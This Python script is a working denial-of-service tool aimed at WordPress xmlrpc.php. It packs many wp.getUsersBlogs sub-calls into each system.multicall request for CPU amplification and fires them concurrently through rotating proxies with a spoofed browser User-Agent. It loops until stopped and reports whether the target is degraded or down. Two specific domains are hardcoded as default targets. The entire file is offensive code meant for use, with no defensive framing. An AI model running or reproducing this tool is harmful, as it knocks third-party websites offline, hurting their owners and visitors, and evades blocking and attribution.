#!/usr/bin/env python3
"""
xmlrpc_burst.py — WordPress xmlrpc.php system.multicall worker exhaustion
Each HTTP request batches N wp.getUsersBlogs calls inside one system.multicall.
The server must process every sub-call before responding — CPU amplification.

Usage:
  python3 xmlrpc_burst.py
  python3 xmlrpc_burst.py --target metoo-buffalo.com
  python3 xmlrpc_burst.py --concurrency 20 --batch 100 --verbose
"""

import requests, time, sys, argparse, threading
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from proxy_pool import make_pool

G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
C = "\033[0;36m"; W = "\033[0m";    B = "\033[1m"

BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROXY_FILE = os.path.join(SCRIPT_DIR, "proxies.txt")

TARGETS = {
    "metoo-buffalo.com":  "https://metoo-buffalo.com/xmlrpc.php",
    "metoo-shatkin.com":  "https://metoo-shatkin.com/xmlrpc.php",
}


def build_multicall(batch_size):
    """Build system.multicall XML with batch_size wp.getUsersBlogs sub-calls."""
    sub = "<value><struct>" \
          "<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>" \
          "<member><name>params</name><value><array><data>" \
          "<value><string>admin</string></value>" \
          "<value><string>wrongpassword</string></value>" \
          "</data></array></value></member>" \
          "</struct></value>"

    calls = "\n".join([sub] * batch_size)

    return f"""<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
{calls}
  </data></array></value></param></params>
</methodCall>"""


def send_one(req_num, url, batch_size, pool):
    proxy = pool.next(slot=req_num)
    proxies = {"http": proxy, "https": proxy} if proxy else {}

    headers = {
        "User-Agent": BROWSER_UA,
        "Content-Type": "text/xml",
    }
    payload = build_multicall(batch_size)

    t0 = time.time()
    try:
        r = requests.post(url, data=payload, headers=headers,
                          proxies=proxies, timeout=30)
        elapsed = time.time() - t0
        # xmlrpc always returns 200 even on auth failure
        # check response body for faultCode = exhausted / disabled
        body = r.text[:120]
        disabled = "xmlrpc" in body.lower() and "disabled" in body.lower()
        return req_num, r.status_code, elapsed, disabled, None
    except Exception as e:
        elapsed = time.time() - t0
        pool.mark_dead(proxy)
        return req_num, 0, elapsed, False, str(e)[:50]


def burst(concurrency, url, batch_size, pool, verbose):
    ok = []; err = []; times = []
    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futures = [ex.submit(send_one, i, url, batch_size, pool)
                   for i in range(1, concurrency + 1)]
        for f in as_completed(futures):
            num, code, elapsed, disabled, error = f.result()
            if code == 200 and not disabled:
                ok.append(code); times.append(elapsed)
            else:
                err.append(code)
            if verbose:
                sym = G + "[✓]" + W if code == 200 and not disabled else R + "[✗]" + W
                note = "DISABLED" if disabled else (error or "")
                print(f"    {sym} Req {num:>3} | HTTP={code or 'ERR'} | {elapsed:.2f}s | {note}")
    return ok, err, times


def main():
    p = argparse.ArgumentParser(description="xmlrpc_burst — WordPress XML-RPC multicall exhaustion")
    p.add_argument("--target",      default="metoo-buffalo.com",
                   help=f"Target domain. Known: {', '.join(TARGETS)}")
    p.add_argument("--concurrency", type=int, default=20,
                   help="Concurrent requests per burst (default: 20)")
    p.add_argument("--batch",       type=int, default=50,
                   help="sub-calls per system.multicall (default: 50, amplification factor)")
    p.add_argument("--proxy-file",  default=PROXY_FILE)
    p.add_argument("--verbose",     action="store_true")
    p.add_argument("--delay",       type=float, default=0)
    args = p.parse_args()

    domain = args.target.replace("https://", "").replace("http://", "").strip("/")
    url = TARGETS.get(domain, f"https://{domain}/xmlrpc.php")

    try:
        pool = make_pool(args.proxy_file)
    except FileNotFoundError:
        print(f"\n  {R}[ERROR]{W} Proxy file not found: {args.proxy_file}")
        sys.exit(1)

    print(f"""
{B}{'='*66}{W}
  xmlrpc_burst — WordPress XML-RPC Multicall Exhaustion
{B}{'='*66}{W}
  Target      : {url}
  Concurrency : {args.concurrency} requests/burst
  Batch size  : {args.batch} sub-calls per request
  Amplification: {args.concurrency * args.batch} server-side calls/burst
  Proxy       : {type(pool).__name__}
  Mode        : Continuous until Ctrl+C
{B}{'='*66}{W}
""")

    total_ok = 0; total_err = 0; burst_num = 0
    all_times = []; start = time.time()

    try:
        while True:
            burst_num += 1
            ts = datetime.now().strftime("%H:%M:%S")

            if not args.verbose:
                print(f"  {C}[Burst {burst_num:>4}]{W} {ts} | Sending {args.concurrency}×{args.batch}...",
                      end="", flush=True)

            ok, err, times = burst(args.concurrency, url, args.batch, pool, args.verbose)

            total_ok  += len(ok)
            total_err += len(err)
            all_times += times

            avail = len(ok) / args.concurrency * 100
            avg_t = sum(times) / len(times) if times else 0
            run_t = time.time() - start

            if avail >= 80:   status = G + "STABLE"   + W
            elif avail >= 30: status = Y + "DEGRADED" + W
            else:             status = R + "DOWN"      + W

            if not args.verbose:
                print(f"\r  {C}[Burst {burst_num:>4}]{W} {ts} | "
                      f"OK={len(ok)}/{args.concurrency} | "
                      f"Avail={avail:>5.1f}% | "
                      f"Avg={avg_t:.2f}s | "
                      f"Amp={args.concurrency * args.batch}/burst | "
                      f"Status={status} | Runtime={run_t:.0f}s")
            else:
                print(f"\n  {C}[Burst {burst_num}]{W} OK={len(ok)}/{args.concurrency} | "
                      f"Avail={avail:.1f}% | Avg={avg_t:.2f}s | {status}\n")

            pool.maybe_refresh()

            if args.delay > 0:
                time.sleep(args.delay)

    except KeyboardInterrupt:
        print(f"\n\n  {Y}[STOPPED]{W} Ctrl+C\n")

    runtime = time.time() - start
    total = total_ok + total_err
    print(f"{B}{'='*66}{W}")
    print(f"  FINAL REPORT")
    print(f"{B}{'='*66}{W}")
    print(f"  Runtime       : {runtime:.0f}s")
    print(f"  Bursts        : {burst_num}")
    print(f"  Total requests: {total}")
    print(f"  Server calls  : {total * args.batch}  (requests × batch)")
    print(f"  200 OK        : {total_ok}  ({total_ok/total*100:.1f}%)" if total else "  No data")
    if all_times:
        print(f"  Avg resp time : {sum(all_times)/len(all_times):.2f}s")
        print(f"  Max resp time : {max(all_times):.2f}s")
    print(f"{B}{'='*66}{W}\n")


if __name__ == "__main__":
    main()
